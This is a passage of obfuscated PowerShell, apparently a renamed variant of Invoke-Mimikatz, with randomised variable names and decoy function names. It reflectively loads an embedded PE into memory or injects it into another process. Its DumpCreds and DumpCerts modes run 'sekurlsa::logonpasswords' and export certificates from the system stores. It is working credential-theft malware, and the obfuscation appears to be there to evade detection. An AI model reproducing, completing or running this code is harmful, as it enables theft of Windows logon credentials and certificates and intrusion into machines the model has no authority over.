						-and $vMfcpWxk99.Name -eq 0 `
						-and $vMfcpWxk99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
				$YonhhIpB99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((federally ([Int64]$PEInfo.PEHandle) ([Int64]$vMfcpWxk99.Name)))
				$NoxXkfFm99 = $tFmeXFwi99.GetModuleHandle.Invoke($YonhhIpB99)
				if ($NoxXkfFm99 -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $YonhhIpB99. Continuing anyways" -WarningAction Continue
				}
				
				$gTWWHesS99 = $tFmeXFwi99.FreeLibrary.Invoke($NoxXkfFm99)
				if ($gTWWHesS99 -eq $false)
				{
					Write-Warning "Unable to free library: $YonhhIpB99. Continuing anyways." -WarningAction Continue
				}
				
				$tGsSkXmW99 = federally ($tGsSkXmW99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$fsGKSFYp99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$RCwgGsQQ99 = federally ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$BSSDmBDY99 = mesa @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$HjviUJRn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RCwgGsQQ99, $BSSDmBDY99)
		
		$HjviUJRn99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$gTWWHesS99 = $tFmeXFwi99.VirtualFree.Invoke($PthOGtLn99, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($gTWWHesS99 -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function Main
	{
		$tFmeXFwi99 = rehabilitate
		$fsGKSFYp99 = send
		$Win32Constants =  sidetracks
		
		$lDVqRULn99 = [IntPtr]::Zero
	
		if (($CCnSyeSq99 -ne $null) -and ($CCnSyeSq99 -ne 0) -and ($clirXOYc99 -ne $null) -and ($clirXOYc99 -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($clirXOYc99 -ne $null -and $clirXOYc99 -ne "")
		{
			$hnpCxjna99 = @(Get-Process -Name $clirXOYc99 -ErrorAction SilentlyContinue)
			if ($hnpCxjna99.Count -eq 0)
			{
				Throw "Can't find process $clirXOYc99"
			}
			elseif ($hnpCxjna99.Count -gt 1)
			{
				$CQmrmEAu99 = Get-Process | where { $_.Name -eq $clirXOYc99 } | Select-Object ProcessName, Id, SessionId
				Write-Output $CQmrmEAu99
				Throw "More than one instance of $clirXOYc99 found, please specify the process ID to inject in to."
			}
			else
			{
				$CCnSyeSq99 = $hnpCxjna99[0].ID
			}
		}
		
		
		if (($CCnSyeSq99 -ne $null) -and ($CCnSyeSq99 -ne 0))
		{
			$lDVqRULn99 = $tFmeXFwi99.OpenProcess.Invoke(0x001F0FFF, $false, $CCnSyeSq99)
			if ($lDVqRULn99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $CCnSyeSq99"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		Write-Verbose "Calling detect"
        try
        {
            $tIaUmgWC99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($tIaUmgWC99 -is [array])
        {
            $ECRsGGsS99 = $tIaUmgWC99[0]
        } else {
            $ECRsGGsS99 = $tIaUmgWC99
        }
        if ( ( $ECRsGGsS99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $ECRsGGsS99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$NJImiPos99 = [Byte[]][Convert]::FromBase64String($MbcbWrKL99)
        }
        else
        {
            [Byte[]]$NJImiPos99 = [Byte[]][Convert]::FromBase64String($NsMtNSPm99)
        }
        $NJImiPos99[0] = 0
        $NJImiPos99[1] = 0
		$PthOGtLn99 = [IntPtr]::Zero
		if ($lDVqRULn99 -eq [IntPtr]::Zero)
		{
			$HWmLdbhd99 = detect -NJImiPos99 $NJImiPos99 -DDrAwOrQ99 $DDrAwOrQ99
		}
		else
		{
			$HWmLdbhd99 = detect -NJImiPos99 $NJImiPos99 -DDrAwOrQ99 $DDrAwOrQ99 -lDVqRULn99 $lDVqRULn99
		}
		if ($HWmLdbhd99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PthOGtLn99 = $HWmLdbhd99[0]
		$vzAzlanv99 = $HWmLdbhd99[1] #only matters if you loaded in to a remote process
		
		
		$PEInfo = tartars -PthOGtLn99 $PthOGtLn99 -fsGKSFYp99 $fsGKSFYp99 -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($lDVqRULn99 -eq [IntPtr]::Zero))
		{
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$tyEZMokz99 = impressionistic -PthOGtLn99 $PthOGtLn99 -FunctionName "powershell_reflective_mimikatz"
				    if ($tyEZMokz99 -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $OYHzcJPM99 = mesa @([IntPtr]) ([IntPtr])
				    $YdxcgCdH99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tyEZMokz99, $OYHzcJPM99)
                    $cGrnoCyN99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($DDrAwOrQ99)
				    [IntPtr]$nWqLBDhg99 = $YdxcgCdH99.Invoke($cGrnoCyN99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cGrnoCyN99)
				    if ($nWqLBDhg99 -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $WADGIDWk99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($nWqLBDhg99)
				        Write-Output $WADGIDWk99
				        $tFmeXFwi99.LocalFree.Invoke($nWqLBDhg99);
				    }
		}
		elseif (($PEInfo.FileType -ieq "DLL") -and ($lDVqRULn99 -ne [IntPtr]::Zero))
		{
			$xaMPyuJC99 = impressionistic -PthOGtLn99 $PthOGtLn99 -FunctionName "VoidFunc"
			if (($xaMPyuJC99 -eq $null) -or ($xaMPyuJC99 -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$xaMPyuJC99 = brontosauri $xaMPyuJC99 $PthOGtLn99
			$xaMPyuJC99 = federally $xaMPyuJC99 $vzAzlanv99
			
			$MLesLGoP99 = impregnation -gmLJonUI99 $lDVqRULn99 -StartAddress $xaMPyuJC99 -tFmeXFwi99 $tFmeXFwi99
		}
		
		if ($lDVqRULn99 -eq [IntPtr]::Zero)
		{
			Willard -PthOGtLn99 $PthOGtLn99
		}
		else
		{
			$gTWWHesS99 = $tFmeXFwi99.VirtualFree.Invoke($PthOGtLn99, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($gTWWHesS99 -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$gICgLvox99  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$DDrAwOrQ99 = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $DDrAwOrQ99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $DDrAwOrQ99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if ($LOsNHuoF99 -eq $null -or $LOsNHuoF99 -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $ErCqbQIS99 -ArgumentList @($MbcbWrKL99, $NsMtNSPm99, "Void", 0, "", $DDrAwOrQ99)
	}
	else
	{
		Invoke-Command -ScriptBlock $ErCqbQIS99 -ArgumentList @($MbcbWrKL99, $NsMtNSPm99, "Void", 0, "", $DDrAwOrQ99) -LOsNHuoF99 $LOsNHuoF99
	}
}
Main
}